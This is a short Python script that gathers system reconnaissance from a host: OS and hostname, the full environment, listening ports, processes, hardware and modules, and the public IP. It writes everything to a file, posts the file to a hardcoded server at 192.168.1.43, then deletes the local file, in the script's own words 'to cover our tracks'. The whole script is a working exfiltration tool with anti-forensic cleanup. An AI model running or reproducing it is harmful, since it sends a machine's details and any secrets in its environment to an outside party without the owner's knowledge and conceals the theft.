#!/usr/bin/python

import requests, os

# getting the name of the operating system 
# and the hostname
un=os.uname()
filename = un[0]+"_"+un[1]

# list of commands to be executed
cmds=[
 ("System name","uname -a"),
 ("Environment","env"),
 ("Open ports","netstat -taepn 2>/dev/null | grep LISTEN"),
 ("Processes","ps aux"),
 ("USB devices","lsusb"),
 ("System modules","lsmod"),
 ("PCI devices","lspci"),
 ("CPU","lscpu")
]

# getting the public IP
os.system("echo > "+filename)
os.system("echo Public IP: >> " + filename)
os.system("wget http://ipecho.net/plain -O- -q >> " + filename)
os.system("echo >> " + filename)

# executing the list of commands
for cmd in cmds:
   os.system("echo "+cmd[0]+": >> " + filename)
   os.system(cmd[1] + " >> " + filename)
   os.system("echo ======================= >> "+filename)

# uploading the file with all the information to our server
requests.post("http://192.168.1.43/up.php",files={"system-info":open(filename,"rt")})

# remove the file to cover our tracks
os.remove(filename)
